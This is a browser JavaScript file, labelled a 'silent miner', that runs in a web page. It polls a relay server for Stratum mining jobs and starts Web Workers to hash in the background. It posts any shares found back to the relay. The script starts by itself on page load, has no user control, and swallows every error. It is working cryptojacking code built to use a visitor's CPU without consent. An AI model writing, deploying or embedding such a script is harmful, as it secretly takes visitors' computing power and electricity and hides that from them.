/**
 * Silent miner: reads __MINER_CFG from miner-config.js; no URL params, no form.
 */
(function () {
  var cfg = typeof __MINER_CFG !== "undefined" ? __MINER_CFG : {};
  function relayUrl() {
    return String(cfg.relay || "http://127.0.0.1:3001").replace(/\/$/, "");
  }
  function workerCount() {
    var n = cfg.workers | 0;
    if (n >= 1 && n <= 4) return n;
    var hc = navigator.hardwareConcurrency || 2;
    return Math.min(4, Math.max(1, Math.floor(hc / 2)));
  }
  function throttleVal() {
    var t = cfg.throttle | 0;
    if (t >= 1 && t <= 10) return t;
    return 2;
  }
  var JOB_POLL_MS = cfg.jobPollMs > 0 ? cfg.jobPollMs : 20000;

  var workerScriptUrl = new URL("miner-worker.js", document.baseURI || location.href).href;
  var pool = [];
  var perWorker = new Map();
  var stratumState = {
    difficulty: 1,
    extranonce1: "",
    extranonce2Size: 4,
    job: null,
  };
  var stratumMiningActive = false;
  var lastWorkerJobKey = "";
  var jobPollTimer = null;

  function jobReady() {
    return stratumState.job && stratumState.job.jobId && stratumState.job.prevhash;
  }

  function workerJobKey() {
    var j = stratumState.job;
    if (!j || !j.jobId) return "";
    return j.jobId + "|" + String(stratumState.difficulty) + "|" + j.ntime;
  }

  function stopJobPoll() {
    if (jobPollTimer != null) {
      clearInterval(jobPollTimer);
      jobPollTimer = null;
    }
  }

  async function fetchJob() {
    var r = await fetch(relayUrl() + "/api/job", { method: "GET" });
    var j = await r.json();
    if (!j.ready) {
      stratumState.job = null;
      return false;
    }
    stratumState.difficulty = j.difficulty || 1;
    stratumState.extranonce1 = j.extranonce1 != null ? j.extranonce1 : "";
    stratumState.extranonce2Size = j.extranonce2Size | 0;
    stratumState.job = j.job;
    return true;
  }

  async function submitShare(payload) {
    await fetch(relayUrl() + "/api/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jobId: payload.jobId,
        extranonce2: payload.extranonce2,
        ntime: payload.ntime,
        nonce: payload.nonce,
      }),
    });
  }

  function makeExtranonce2Hex(size, workerIndex, jobId) {
    var u = new Uint8Array(size);
    var uid = cfg.userId && String(cfg.userId).trim();
    if (!uid) {
      crypto.getRandomValues(u);
      u[0] = (u[0] ^ (workerIndex & 255)) & 255;
      return StratumUtils.bytesToHex(u);
    }
    var seed = uid + "|" + (jobId || "") + "|" + workerIndex;
    var h = 2166136261;
    for (var i = 0; i < seed.length; i++) {
      h ^= seed.charCodeAt(i);
      h = Math.imul(h, 16777619) >>> 0;
    }
    for (var b = 0; b < size; b++) {
      h = Math.imul(h ^ (b + 13), 2246822519) >>> 0;
      u[b] = h & 255;
    }
    return StratumUtils.bytesToHex(u);
  }

  function nonceSegmentParams() {
    var idx = cfg.nonceSegmentIndex | 0;
    var cnt = cfg.nonceSegmentCount | 0;
    if (cnt < 1) cnt = 1;
    if (idx < 0) idx = 0;
    if (idx >= cnt) idx = cnt - 1;
    return { nonceSegmentIndex: idx, nonceSegmentCount: cnt };
  }

  function startStratumWorkersOnly(count, throttle) {
    var size = stratumState.extranonce2Size | 0;
    if (size < 1 || size > 32) throw new Error("extranonce2_size");
    var j = stratumState.job;
    var seg = nonceSegmentParams();
    for (var i = 0; i < count; i++) {
      var w = new Worker(workerScriptUrl);
      w.onmessage = handleMinerMessage;
      w.onerror = function () {};
      w.postMessage({
        cmd: "startStratum",
        workerId: i,
        numWorkers: count,
        throttle: throttle,
        difficulty: stratumState.difficulty || 1,
        nonceSegmentIndex: seg.nonceSegmentIndex,
        nonceSegmentCount: seg.nonceSegmentCount,
        job: {
          jobId: j.jobId,
          prevhash: j.prevhash,
          coinb1: j.coinb1,
          coinb2: j.coinb2,
          merkleBranches: j.merkleBranches,
          version: j.version,
          nbits: j.nbits,
          ntime: j.ntime,
          extranonce1: stratumState.extranonce1,
          extranonce2Hex: makeExtranonce2Hex(size, i, j.jobId),
        },
      });
      pool.push(w);
    }
  }

  function handleMinerMessage(ev) {
    if (!ev.data) return;
    if (ev.data.type === "stats") {
      perWorker.set(ev.data.workerId, {
        total: ev.data.total,
        rate: ev.data.rate,
        shares: ev.data.shares,
      });
      return;
    }
    if (ev.data.type === "stratum_share") {
      submitShare(ev.data).catch(function () {});
    }
  }

  async function pollJobWhileMining() {
    if (!stratumMiningActive) return;
    try {
      var ok = await fetchJob();
      if (!ok || !jobReady()) return;
      var k = workerJobKey();
      if (k === lastWorkerJobKey) return;
      lastWorkerJobKey = k;
      pool.forEach(function (w) {
        try {
          w.postMessage({ cmd: "stop" });
          w.terminate();
        } catch (_) {}
      });
      pool = [];
      perWorker.clear();
      startStratumWorkersOnly(workerCount(), throttleVal());
    } catch (_) {}
  }

  async function startMining() {
    var ok = await fetchJob();
    if (!ok || !jobReady()) return false;
    pool.forEach(function (w) {
      try {
        w.postMessage({ cmd: "stop" });
        w.terminate();
      } catch (_) {}
    });
    pool = [];
    perWorker.clear();
    stratumMiningActive = true;
    try {
      startStratumWorkersOnly(workerCount(), throttleVal());
      lastWorkerJobKey = workerJobKey();
      stopJobPoll();
      jobPollTimer = setInterval(pollJobWhileMining, JOB_POLL_MS);
    } catch (_) {
      stratumMiningActive = false;
      return false;
    }
    return true;
  }

  async function waitForJobAndAutoStart() {
    var maxAttempts = cfg.waitAttempts > 0 ? cfg.waitAttempts : 60;
    var intervalMs = cfg.waitIntervalMs > 0 ? cfg.waitIntervalMs : 2000;
    for (var a = 0; a < maxAttempts; a++) {
      try {
        var ok = await fetchJob();
        if (ok && jobReady()) {
          await startMining();
          return true;
        }
      } catch (_) {}
      await new Promise(function (r) {
        setTimeout(r, intervalMs);
      });
    }
    return false;
  }

  window.addEventListener("beforeunload", function () {
    stopJobPoll();
    pool.forEach(function (w) {
      try {
        w.terminate();
      } catch (_) {}
    });
  });

  waitForJobAndAutoStart();
})();
